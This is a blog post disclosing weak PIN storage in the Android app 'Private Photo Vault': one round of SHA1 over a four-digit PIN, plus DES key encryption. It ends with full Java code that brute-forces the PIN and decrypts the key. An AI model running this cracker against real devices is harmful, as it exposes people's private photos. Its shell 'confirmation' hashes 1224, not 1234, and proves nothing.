---
layout: post
title: Password Storage In Sensitive Apps
---
Well it isn’t the promised Pork Explosion disclosure, but I ensure you that is coming soon. I have word the update to mitigate it is done, and will be shipping this month. I do however have something else, an example of what Pork Explosion could be stacked with.

Last week I was contacted by a forensic specialist for a law enforcement agency. They had a phone that could make or break a very sensitive case, and their commercial mobile forensic tools were failing to do, well anything. They could not extract any data off the device. After verifying their identity and purpose, I agreed to help. Using a backdoor, very much like Pork Explosion, and some trickery we were able to fully extract all data off the device. This had me thinking, what next? What if this criminal was using another layer of security? What if they had a "secure storage" app, what if their photos, videos and what not were encrypted in an addition layer of security?

Off to the Google PlayStore, searched for "Secure Photo" and downloaded the first result, sure enough the files stored were encrypted.... but the PIN was stored in plaintext as a shared preference. Ok no fun, so I install the second result.

>“Have any photos or videos you don't want someone to see? Hide these private pics and vids securely with Private Photo Vault.”

The second result was [“Private Photo Vault”](https://privatephotovault.com/) by Legendary Software Labs LLC. It has a solid 4 star rating, 1,000,000 to 5,000,000 downloads, and was lasted updated just over two months ago. Using Pork Explosion, I rooted the device and extracted the data directory for Private Photo Vault. The initial results were more promising than the first app, no plaintext PIN stored in the shared preferences. The promise didn’t last long:

Stored in /data/data/com.enchantedcloud.photovault/shared_prefs/com.enchantedcloud.photovault_preferences.xml was what appeared to be the sha1 hash of the PIN and some base64 encoded key.

><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
><map>
><string name="pin">7110eda4d09e062aa5e4a390b0a572ac0d2c0220</string>
><string name=“enc_keys_pin">Dar+SDapSbp1mKcztPYWi4vDcvGBNLM8B7WVy00MT1WK0gd2R4wAdg==</string>
></map>

A quick test confirms:

>Jons-Mac-Pro:~ jcase$ echo -ne 1224|shasum
>4fd505f8aeed956f068c4ce57bfc30a6131b7c79 

A single iteration of SHA1 is all that is protecting your PIN code (which is limited to four digits in length). Then DES is used, padding the PIN with “0” until it has a length of 8, to encrypt a key. I stopped analysis at this point, the app was already beyond broken. The app then goes on to use   Facebook’s Android encryption library [Conceal](https://github.com/facebook/conceal), but I did not go any further.

These companies are selling products that claim to securely store your most intimate pieces of data, yet are at most snake oil. You would have near equal protection just by changing the file extension and renaming the photos.


So for those that want to crack the pin and key for a “Private Photo Vault” installation, here you go.

>public class Main {
>
>    public static void main(String[] args) {
>     
>     // "pin" and "enc_keys_pin" from com.enchantedcloud.photovault_preferences.xml
>        String hashedPIN = "7110eda4d09e062aa5e4a390b0a572ac0d2c0220"; // 1234
>        String encKeyPin = "Dar+SDapSbp1mKcztPYWi4vDcvGBNLM8B7WVy00MT1WK0gd2R4wAdg=="; // 1e8a99cb-ebe8-452c-b9da-6466a8a60e02
>
>        System.out.println("Cracking pin...");
>        String PIN = crackPIN(hashedPIN);
>        System.out.println("PIN is " + PIN);
>
>        System.out.println("Decrypting Key...");
>        String KEY = decryptKey(encKeyPin,PIN);
>        System.out.println("KEY is " + KEY);
>    }
>    
>    private static String decryptKey (String KEY, String PIN) {
>
>        while (PIN.length() < 8) {
>            PIN = PIN + 0;
>        }
>
>        SecretKey secKey = null;
>        try {
>            secKey = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(PIN.getBytes("UTF8")));
>            byte[] bKey = Base64.decode(KEY);
>            Cipher cipher = Cipher.getInstance("DES");
>            cipher.init(2, (secKey));
>            return new String(cipher.doFinal(bKey));
>        } catch (InvalidKeySpecException e) {
>            e.printStackTrace();
>        } catch (NoSuchAlgorithmException e) {
>            e.printStackTrace();
>        } catch (InvalidKeyException e) {
>            e.printStackTrace();
>        } catch (UnsupportedEncodingException e) {
>            e.printStackTrace();
>        } catch (BadPaddingException e) {
>            e.printStackTrace();
>        } catch (IllegalBlockSizeException e) {
>            e.printStackTrace();
>        } catch (NoSuchPaddingException e) {
>            e.printStackTrace();
>        }
>        return null;
>    }
>
>    private static String crackPIN(String hashedPIN) {
>        for (int i = 0; i <= 9999;i++) {
>            String testPin = Integer.toString(i);
>            while (testPin.length() < 4) {
>                testPin = "0" + testPin;
>            }
>            try {
>                MessageDigest md = MessageDigest.getInstance("SHA-1");
>                md.reset();
>                md.update(testPin.getBytes());
>                if (hashedPIN.equals(bytesToHex(md.digest()))) {
>                    return testPin;
>
>                }
>            } catch (NoSuchAlgorithmException e) {
>                e.printStackTrace();
>            }
>        }
>        return null;
>    }
>
>    private static String bytesToHex(byte[] bytes) {
>        char[] hexArray = "0123456789abcdef".toCharArray();
>        char[] hexChars = new char[bytes.length * 2];
>        for ( int j = 0; j < bytes.length; j++ ) {
>            int v = bytes[j] & 0xFF;
>            hexChars[j * 2] = hexArray[v >>> 4];
>            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
>        }
>        return new String(hexChars);
>    }
>}
